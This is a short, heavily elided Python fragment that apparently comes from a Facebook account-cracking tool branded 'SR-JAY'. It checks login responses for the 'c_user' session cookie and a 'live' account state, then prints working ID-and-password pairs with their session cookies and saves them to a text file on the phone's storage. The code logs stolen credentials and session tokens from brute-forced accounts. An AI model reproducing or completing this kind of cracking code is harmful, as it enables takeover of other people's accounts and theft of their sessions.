            ...
            if "c_user" in log_cookies:
                ...
                if "live" in check:
                    ...
                    if len(bkas)% 2 == 0:
                        ...
                        print(f" {green}(SR-JAY-OK) {cid}|{pas} ")
                        print(f" {green}Cookie : {green}{coki}")
                        open("/sdcard/SR-JAY-COOKIE-OK.txt", "a").write(f"{cid}|{pas}|{coki}\n")
                        oks.append(cid)
                        break
                else:
                    break
